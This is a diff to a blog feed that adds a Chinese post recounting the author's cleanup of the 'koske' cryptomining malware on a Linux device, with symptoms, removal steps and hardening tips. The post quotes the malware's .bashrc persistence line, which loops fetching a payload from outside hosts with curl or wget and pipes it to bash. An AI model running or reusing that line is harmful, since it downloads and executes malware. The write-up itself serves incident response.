@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>koske 恶意软件</title>
+    <link href="/2026/02/08/koske-malware/"/>
+    <url>/2026/02/08/koske-malware/</url>
+    
+    <content type="html"><![CDATA[<h1 id="koske-恶意软件"><a href="#koske-恶意软件" class="headerlink" title="koske 恶意软件"></a>koske 恶意软件</h1><h2 id="入侵表现"><a href="#入侵表现" class="headerlink" title="入侵表现"></a>入侵表现</h2><p>在去年的一天，我发现某个含有弱密码的设备使用 sudo 时输入密码后一直提示密码错误，然后发现 root 也无法登录了。</p><p>查看 <code>/etc/passwd</code> 的修改日期，发现最近有过修改。<code>chage -l</code> 命令的输出也确认了这一点。</p><p>查看文件系统，发现有 <code>/xmrig1</code> 和 <code>/xmrig2</code> 目录，其中包括了在 x86 和 ARM 下的 xmrig 挖矿程序。你可能还会观察到 <code>xmrig</code> 正在运行。</p><p>查看日志，发现 bash history、<code>/var/log/apt/history.log</code>、systemd journal 等都被清除了。</p><p>重启后，服务初始化时有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs log">[  OK  ] Started Koske Mining Background Script.<br>shellkoske.service<br></code></pre></td></tr></table></figure><p>实际上我重启后有个报错 <code>ERROR: ld.so: object &#39;/dev/shm/hideproc.so&#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</code>。</p><p>搜索一下，至此已经确定是中了 <code>koske</code> 恶意软件的攻击。在 <code>.bashrc</code> 等发现恶意脚本的形式大致为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup bash -c &#x27;OFFSET=58101; while true; do if command -v curl &gt;/dev/null 2&gt;&amp;1; then if curl -k --output /dev/null --silent --head --fail &quot;https://k0ske1.short.gy/panda_v14.jpg&quot;; then curl -k -fsL --range \58101- &quot;https://k0ske1.short.gy/panda_v14.jpg&quot; | bash; elif curl -k --output /dev/null --silent --head --fail &quot;https://tini.fyi/panda_v14.jpg&quot;; then curl -k -fsL --range \58101- &quot;https://tini.fyi/panda_v14.jpg&quot; | bash; else notify-send &quot;Nijedan link nije dostupan&quot;; fi; elif command -v wget &gt;/dev/null 2&gt;&amp;1; then if wget --no-check-certificate --spider -q &quot;https://k0ske1.short.gy/panda_v14.jpg&quot;; then wget --no-check-certificate --header=&quot;Range: bytes=\58101-&quot; -qO- &quot;https://k0ske1.short.gy/panda_v14.jpg&quot; | bash; elif wget --no-check-certificate --spider -q &quot;https://tini.fyi/panda_v14.jpg&quot;; then wget --no-check-certificate --header=&quot;Range: bytes=\58101-&quot; -qO- &quot;https://tini.fyi/panda_v14.jpg&quot; | bash; else notify-send &quot;Nijedan link nije dostupan&quot;; fi; else notify-send &quot;curl i wget nisu instalirani&quot;; fi; sleep 10; done&#x27; &amp;<br></code></pre></td></tr></table></figure><h2 id="清除威胁"><a href="#清除威胁" class="headerlink" title="清除威胁"></a>清除威胁</h2><p>由于已经被爆破，我首先切断了网络连接，以防攻击者进一步的操作。</p><p>由于该设备可以从 eMMC 或 SD 卡启动，且优先从 SD 卡启动，我插入含有另一个系统的 SD 卡后成功进入系统（需要清除 SPI Flash），然后挂载 eMMC 并把 <code>/etc/passwd</code> 和  <code>/etc/shadow</code> 恢复了备份的版本（有个 <code>/etc/passwd-</code>、<code>/etc/shadow-</code>）。如果你是 PC 等可以用 grub 等修改启动参数的，可以直接用“单用户模式”重新取得 root 权限。</p><p>检查仅存的 apt log，该软件安装了 clinfo 和 tmate，直接卸载。</p><p>删除新增的 koske 用户。</p><p>systemd 删除 <code>shellkoske.service</code>。</p><p>删除 <code>/xmrig1</code>、<code>/xmrig2</code>。</p><p>在各个目录中以 <code>koske</code>、<code>k0ske</code> 为关键字搜索，大致需要删除的有：</p><p>删除 <code>~/.bashrc.koske</code>，还原 <code>~/.bashrc</code>、<code>~/.bash_logout</code>，去掉攻击者加的东西。（如果有其他用户比如 root，也要检查其对应的目录下有无恶意脚本，根目录也要看一下，下同）</p><p>删除 <code>~/.config/autostart/scheduler.desktop</code> 里的自启脚本。</p><p>删除 <code>/etc/ld.so.preload</code> 里的 <code>/dev/shm/hideproc.so</code>，我这里的 <code>/dev/shm</code> 是不会持久化的，如果你还有这个 <code>hideproc.so</code>，也需要删除。</p><p>删除 <code>/etc/rc.local</code> 里的恶意脚本。</p><p>如果 <code>/var/spool/cron/crontabs/</code> 下定时任务有恶意脚本的话，需要将其删除。</p><p>由于攻击过去一段时间了，可能我也记不清楚了，可以询问 DeepSeek 等获取清除恶意脚本的检查建议。</p><p>HOME 下还留了个 <code>tmate-2.4.0-static-linux-i386</code>，说实话我不知道为什么它要装这个。</p><p>还要检查 <code>authorized_keys</code> 看看有没有可疑的公钥，不过我好像没找到。</p><p>全都清除完后，重启，再 grep 一下看看有没有恶意软件残留。</p><h2 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h2><p>更新系统。</p><p>修改密码。</p><p>SSH 使用仅公钥登录，禁用 root 用户的 SSH 登录。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://www.aquasec.com/blog/ai-generated-malware-in-panda-image-hides-persistent-linux-threat/">听说该软件是 AI 生成的</a>，现在 AI Agent 已经可以这样的恶意软件了，着实让我吃了一惊。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Linux</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Markdown Preview Enhanced 输出 PDF 时代码块自动换行且不另起一页</title>
     <link href="/2025/10/02/mpe-export-pdf/"/>
     <url>/2025/10/02/mpe-export-pdf/</url>
